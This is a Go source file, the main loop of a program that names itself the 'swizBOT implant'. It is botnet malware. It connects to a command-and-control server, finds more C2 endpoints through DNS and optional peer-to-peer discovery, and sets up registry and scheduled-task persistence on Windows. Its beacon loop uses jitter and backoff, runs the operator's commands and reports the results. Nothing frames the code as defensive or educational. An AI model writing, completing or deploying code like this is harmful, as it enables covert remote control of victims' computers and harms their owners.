package main

import (
	"context"
	"io"
	"log"
	"os"
	"time"
)

// Package-level runtime state shared by the command dispatcher.
var (
	cfg      Config
	cfgBotID string
	client   *C2Client
	logger   *log.Logger
)

func initLogger(path string) (*log.Logger, error) {
	if path == "" {
		return log.New(os.Stderr, "[swizbot] ", log.LstdFlags), nil
	}
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)
	if err != nil {
		return nil, err
	}
	return log.New(io.Writer(f), "[swizbot] ", log.LstdFlags), nil
}

func logf(format string, args ...interface{}) {
	if logger != nil {
		logger.Printf(format, args...)
	}
}

func sendResult(resp Response) {
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()
	if err := client.SendResult(ctx, resp); err != nil {
		logf("result %s failed: %v", resp.CommandID, err)
	}
}

func main() {
	cfg = LoadConfig()
	var err error
	logger, err = initLogger(cfg.LogPath)
	if err != nil {
		logger = log.New(os.Stderr, "[swizbot] ", log.LstdFlags)
	}
	cfgBotID = cfg.BotID
	if bakedNote != "" {
		logf("%s", bakedNote)
	}
	client = NewC2Client(cfg)

	logf("swizBOT implant starting (id=%s os=%s arch=%s endpoints=%d)",
		cfg.BotID, goosName(), goarchName(), len(client.endpoints))

	// Retry any results cached by a previous run.
	flushCtx, cancel := context.WithTimeout(context.Background(), 90*time.Second)
	client.FlushCache(flushCtx)
	cancel()

	// Start the discovery layers (P2P is opt-in).
	ctx, stop := context.WithCancel(context.Background())
	defer stop()

	if cfg.DNSDomain != "" {
		if found := dnsLookup(cfg.DNSDomain); len(found) > 0 {
			logf("dns discovery: %v", found)
			client.AddEndpoints(found...)
		}
	}
	var p2p *PeerDiscovery
	if cfg.P2P {
		p2p = NewPeerDiscovery(cfg.PeerPort,
			func() []string { return client.endpoints },
			func(list []string) {
				client.AddEndpoints(list...)
				logf("p2p: learned %v", list)
			}, logf)
		p2p.Start(ctx)
		defer p2p.Stop()
	}

	// Persistence: registry + scheduled task (Windows only).
	if isWindows() {
		if err := ensurePersistence(); err != nil {
			logf("persistence: %v", err)
		}
	}

	// Main beacon loop with exponential backoff on total failure.
	backoff := 5 * time.Second
	for {
		cmd, paused, err := client.Checkin(ctx)
		if err != nil {
			logf("checkin failed: %v (backoff %s)", err, backoff)
			select {
			case <-ctx.Done():
				return
			case <-time.After(backoff):
			}
			backoff *= 2
			if backoff > cfg.BackoffMax {
				backoff = cfg.BackoffMax
			}
			continue
		}
		backoff = 5 * time.Second

		// fleet paused: drop to a slow poll so a resume reaches us
		if paused {
			logf("fleet paused by operator; slow-polling")
			select {
			case <-ctx.Done():
				return
			case <-time.After(5 * time.Minute):
			}
			continue
		}

		if cmd != nil && !cmd.IsEmpty() {
			logf("command %s/%s received", cmd.Type, cmd.ID)
			resp := executeCommand(*cmd)
			if resp.CommandID != "" && resp.Status != "" {
				if resp.Status == "failed" {
					logf("command %s failed: %s", cmd.Type, resp.Output)
				}
				sendResult(resp)
			}
		}

		// Re-check DNS directive every hour when configured.
		if cfg.DNSDomain != "" && time.Now().Minute() == 0 {
			if found := dnsLookup(cfg.DNSDomain); len(found) > 0 {
				client.AddEndpoints(found...)
			}
		}

		sleep := cfg.Interval
		if cfg.Jitter > 0 {
			sleep += time.Duration(randN(int64(cfg.Jitter)))
		}
		select {
		case <-ctx.Done():
			return
		case <-time.After(sleep):
		}
	}
}

func randN(n int64) int64 {
	if n <= 0 {
		return 0
	}
	return newRand().Int63n(n)
}
